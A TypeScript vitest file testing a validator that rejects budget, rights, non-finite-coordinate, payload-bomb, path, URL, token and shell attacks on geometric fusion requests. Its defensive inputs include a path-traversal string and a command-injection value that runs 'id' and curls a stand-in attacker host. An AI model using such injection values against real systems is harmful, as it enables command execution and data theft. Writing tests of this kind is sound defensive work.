import { describe, expect, it } from "vitest";

import { fusionAdversarialFixtures } from "../../../packages/test-fixtures/src/fusion/catalog.js";
import { assertBoundedFusionRequest, assertSimilaritySafety } from "./reference-boundary.js";
import { validFusionRequest } from "./synthetic-security-fixtures.js";

describe("C9 bounded/non-finite/path/URL and geometric attack boundary", () => {
  it("accepts a bounded path-free request with two source kinds and exact rights", () => {
    expect(() => {
      assertBoundedFusionRequest(validFusionRequest);
    }).not.toThrow();
  });

  it("rejects every rights, training, source-count, reference and anchor budget attack", () => {
    expect(() => {
      assertBoundedFusionRequest({
        ...validFusionRequest,
        sources: validFusionRequest.sources.slice(0, 1),
      });
    }).toThrow("FUSION_SOURCE_BUDGET_EXCEEDED");
    expect(() => {
      assertBoundedFusionRequest({
        ...validFusionRequest,
        sources: validFusionRequest.sources.map((source) => ({ ...source, kind: "plan-proposal" })),
      });
    }).toThrow("FUSION_SOURCE_KINDS_INSUFFICIENT");
    expect(() => {
      assertBoundedFusionRequest({
        ...validFusionRequest,
        sources: [validFusionRequest.sources[0], { ...validFusionRequest.sources[0] }],
      });
    }).toThrow("FUSION_DUPLICATE_SOURCE_REFERENCE");
    expect(() => {
      assertBoundedFusionRequest({
        ...validFusionRequest,
        sources: validFusionRequest.sources.map((source, index) =>
          index === 0
            ? {
                ...source,
                rights: { serviceProcessingConsent: true, trainingUseConsent: "allowed" },
              }
            : source,
        ),
      });
    }).toThrow("FUSION_RIGHTS_DENIED");
    const tooManyAnchors = new Array(257).fill(validFusionRequest.anchorGroups[0]?.anchors[0]);
    expect(() => {
      assertBoundedFusionRequest({
        ...validFusionRequest,
        anchorGroups: [{ ...validFusionRequest.anchorGroups[0], anchors: tooManyAnchors }],
      });
    }).toThrow("FUSION_ANCHOR_BUDGET_EXCEEDED");
  });

  it.each([Number.NaN, Number.POSITIVE_INFINITY, Number.NEGATIVE_INFINITY, 1.5])(
    "rejects non-finite or non-integer coordinate %s",
    (value) => {
      expect(() => {
        assertBoundedFusionRequest(withFirstSourcePointX(value));
      }).toThrow("FUSION_NON_FINITE_OR_OVERFLOW");
    },
  );

  it("rejects contract-coordinate overflow and recursive/array payload bombs", () => {
    const overflow = fusionAdversarialFixtures.find(({ kind }) => kind === "overflow-coordinate");
    if (
      overflow === undefined ||
      typeof overflow.payload !== "object" ||
      overflow.payload === null
    ) {
      throw new Error("Missing overflow adversarial fixture.");
    }
    const value = Number((overflow.payload as { readonly value?: unknown }).value);
    expect(() => {
      assertBoundedFusionRequest(withFirstSourcePointX(value));
    }).toThrow("FUSION_ANCHOR_POINT_INVALID");
    let deep: unknown = "leaf";
    for (let index = 0; index < 22; index += 1) deep = { nested: deep };
    expect(() => {
      assertBoundedFusionRequest({ ...validFusionRequest, metadata: deep });
    }).toThrow("FUSION_PAYLOAD_BUDGET_EXCEEDED");
    expect(() => {
      assertBoundedFusionRequest({ ...validFusionRequest, metadata: new Array(10_001).fill(0) });
    }).toThrow("FUSION_ARRAY_BUDGET_EXCEEDED");
  });

  it("rejects every public path, URL, token, shell and executable shape", () => {
    const adversarial = fusionAdversarialFixtures.filter(({ kind }) =>
      ["path-injection", "url-injection"].includes(kind),
    );
    for (const fixture of adversarial) {
      expect(() => {
        assertBoundedFusionRequest({ ...validFusionRequest, attack: fixture.payload });
      }).toThrow("FUSION_PUBLIC_LOCATION_FIELD_DENIED");
    }
    for (const attack of [
      { command: "fixed-looking" },
      { executable: "fusion-worker" },
      { nested: "../../private/customer.json" },
      { nested: "file:///private/customer.json" },
      { nested: "$(id); curl https://attacker.invalid" },
      { objectKey: "tenant/private/source" },
      { token: "Bearer synthetic-secret" },
    ]) {
      expect(() => {
        assertBoundedFusionRequest({ ...validFusionRequest, attack });
      }).toThrow();
    }
  });

  it("rejects collinearity and reflection while accepting non-collinear orientation-preserving anchors", () => {
    expect(() => {
      assertSimilaritySafety({
        anchors: [
          { xMm: 0, yMm: 0, zMm: 0 },
          { xMm: 1_000, yMm: 0, zMm: 0 },
          { xMm: 0, yMm: 1_000, zMm: 0 },
        ],
        determinantPartsPerMillion: 1_000_000,
      });
    }).not.toThrow();
    expect(() => {
      assertSimilaritySafety({
        anchors: [
          { xMm: 0, yMm: 0, zMm: 0 },
          { xMm: 1_000, yMm: 0, zMm: 0 },
          { xMm: 2_000, yMm: 0, zMm: 0 },
        ],
        determinantPartsPerMillion: 1_000_000,
      });
    }).toThrow("FUSION_DEGENERATE_ANCHORS");
    expect(() => {
      assertSimilaritySafety({
        anchors: [
          { xMm: 0, yMm: 0, zMm: 0 },
          { xMm: 1_000, yMm: 0, zMm: 0 },
          { xMm: 0, yMm: 1_000, zMm: 0 },
        ],
        determinantPartsPerMillion: -1_000_000,
      });
    }).toThrow("FUSION_REFLECTION_REJECTED");
  });
});

function withFirstSourcePointX(value: number) {
  const firstGroup = validFusionRequest.anchorGroups[0];
  const firstAnchor = firstGroup?.anchors[0];
  if (firstGroup === undefined || firstAnchor === undefined) {
    throw new Error("Synthetic request is missing its first anchor.");
  }
  return {
    ...validFusionRequest,
    anchorGroups: [
      {
        ...firstGroup,
        anchors: [
          {
            ...firstAnchor,
            sourcePoint: { ...firstAnchor.sourcePoint, xMm: value },
          },
          ...firstGroup.anchors.slice(1),
        ],
      },
    ],
  };
}
